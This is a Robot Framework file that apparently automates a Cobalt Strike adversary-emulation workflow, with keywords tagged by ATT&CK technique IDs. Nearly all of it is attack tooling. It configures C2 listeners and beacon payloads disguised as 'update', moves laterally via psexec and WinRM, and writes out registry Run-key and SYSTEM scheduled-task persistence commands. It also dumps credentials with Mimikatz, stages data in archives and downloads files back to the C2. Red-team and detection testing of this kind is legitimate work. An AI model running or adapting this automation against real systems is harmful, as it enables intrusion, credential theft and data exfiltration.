*** Settings ***
Documentation       hunt_1 Automate Workflow

Library             cobaltstrikec2/cobaltstrike.py
Library             Process
Library             OperatingSystem
Library             Collections
Library             DateTime
Library             String


*** Variables ***
# **************************************
# CobaltStrike Variables
# **************************************
${CS_IP}                        10.50.100.5
${CS_USER}                      operator
${CS_PASS}                      password
${CS_DIR}                       /opt/cobaltstrike
${CS_PORT}                      50050
${SUDO_NEEDED}                  ${False}
${ARTIFACT_DIR}                 artifact
${DEBUG_MODE}                   ${False}

${WORKDIR}                      %{HOME}/sandworm/

${HTTP_LISTENER}                HTTP
${HTTP_LISTENER_PORT}           80
${HTTP_LISTENER_TYPE}           Beacon_HTTP

${HTTPS_LISTENER}               HTTPS
${HTTPS_LISTENER_PORT}          443
${HTTPS_LISTENER_TYPE}          Beacon_HTTPS

${HTTP_PAYLOAD_NAME}            update
${HTTP_PAYLOAD_TEMPLATE}        exe
${HTTP_PAYLOAD_RETRIES}         5

${APPDATA_PATH}                 AppData\\Local\\Temp
${RUN_KEY}                      HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
${ARCH}                         x64
${SCAN_METHOD}                  icmp


*** Keywords ***
Setup C2
    [Arguments]
    ...    ${ip}=
    ...    ${user}=
    ...    ${password}=
    ...    ${cs_dir}=
    ...    ${port}=
    ...    ${data_dir}=
    ...    ${debug}=
    ...    ${sudo_required}=

    Log To Console    \n*** Start C2 ***
    Start C2

Teardown C2
    Log To Console    \n*** Remove Listener ***
    Remove Listener
    ...    ${HTTP_LISTENER}

    Log To Console    \n*** Stop C2 ***
    Stop C2

Lateral Move With Psexec64
    [Tags]    tid:t1569.002
    [Arguments]    ${current_session}    ${target_ip}    ${listener_name}
    ${result}=    Run Bjump    ${current_session}    psexec64    ${target_ip}    ${listener_name}
    RETURN    ${result}

Lateral Move With Winrm
    [Tags]    tid:t1021.006
    [Arguments]    ${current_session}    ${target_ip}    ${listener_name}
    ${result}=    Run Bjump    ${current_session}    winrm64    ${target_ip}    ${listener_name}
    RETURN    ${result}

Persistence With Registry
    [Tags]    tid:t1547.001
    [Arguments]    ${current_session}    ${beacon_location}
    Log To Console    \nCreating persistence via registry\nbeacon location:${beacon_location}
    ${reg_cmd}=    Set Variable
    ...    reg add "HKEY_CURRENT_USER\\\\Software\\\\Windows\\\\CurrentVersion\\\\Run" /v Update /t REG_SZ /d "${beacon_location}" /f
    ${reg_result}=    Issue Shell Cmd    ${current_session}    ${reg_cmd}
    Should Be True    ${reg_result}[success]

Persistence With Schtasks
    [Tags]    tid:t1053.005
    [Arguments]    ${current_session}    ${beacon_location}
    Log To Console    \nCreating persistence via Schtasks
    ${schtasks_cmd}=    Set Variable    schtasks /create /tn Updates /sc ONSTART /ru SYSTEM /tr "${beacon_location}" /f
    ${schtasks_result}=    Issue Shell Cmd    ${current_session}    ${schtasks_cmd}
    Should Be True    ${schtasks_result}[success]

Network Enumerate
    [Tags]    tid:t1046
    [Arguments]    ${current_session}    ${target_ip}    ${list_of_ports}    ${method}
    ${result}=    Run Bportscan    ${current_session}    ${target_ip}    ${list_of_ports}    ${method}
    RETURN    ${result}

GetUID
    [Tags]    tid:t1033
    [Arguments]    ${session}
    Log To Console    \nRunning getuid
    ${output}=    Run Getuid    ${session}
    RETURN    ${output}

Get Processes
    [Tags]    tid:t1057
    [Arguments]    ${session}
    Log To Console    \nGetting processes
    ${output}=    Issue Shell Cmd    ${session}    tasklist
    RETURN    ${output}

Upload File
    [Tags]    tid:1608.001
    [Arguments]    ${session}    ${local_file}    ${upload_path}
    cobaltstrike.Upload File    ${session}    ${local_file}    ${upload_path}

List Directory
    [Tags]    tid:t1083
    [Arguments]    ${session}    ${directory}=.
    Log To Console    \nGetting listing of directory: ${directory}
    ${output}=    Issue Shell Cmd    ${session}    dir ${directory}
    RETURN    ${output}

Dump Credentials
    [Tags]    tid:t1003.001
    [Arguments]    ${session}
    Log To Console    \nDumping Credentials
    ${output}=    Run Mimikatz    ${session}
    RETURN    ${output}

Stage Data
    [Tags]    tid:t1560.001,t1074.001
    [Arguments]    ${session}    ${source_directory}    ${destination}
    Log To Console    \nStaging data to download
    ${output}=    Issue Powershell Cmd
    ...    ${session}
    ...    Compress-Archive -Path ${source_directory} -DestinationPath ${destination}
    RETURN    ${output}

Download File
    [Tags]    t1005
    [Arguments]    ${session}    ${target_file}
    ${output}=    cobaltstrike.Download File    ${session}    ${target_file}
    RETURN    ${output}

Initial Access
    [Tags]    tid:t1021.004
    [Arguments]    ${target_ip}    ${username}    ${password}    ${local_beacon_file}
    Log To Console    \nPerforming initial access to ${target_ip}
    cobaltstrike.Initial_Access
    ...    ${target_ip}
    ...    ${username}
    ...    ${password}
    ...    ${local_beacon_file}

Create Listener
    [Arguments]    ${name}    ${port}    ${type}    ${host}
    Log To Console    \nCreating listener ${name} on ${host}:${port}
    cobaltstrike.Create Listener
    ...    ${name}
    ...    ${port}
    ...    ${type}
    ...    ${host}

Create Payload
    [Arguments]    ${name}    ${template}    ${listener}    ${output_dir}    ${retries}=3
    Log To Console    \nGenerating payload ${name}
    ${path}=    cobaltstrike.Create Payload
    ...    ${name}
    ...    ${template}
    ...    ${listener}
    ...    ${output_dir}
    ...    ${retries}
    RETURN    ${path}

Remove Listener
    [Arguments]    ${name}
    Log To Console    \nRemoving listener ${name}
    cobaltstrike.Remove Listener    ${name}

Session Sleep
    [Arguments]    ${session}    ${sleep_time}    ${jitter}=0
    cobaltstrike.Session Sleep    ${session}    ${sleep_time}    ${jitter}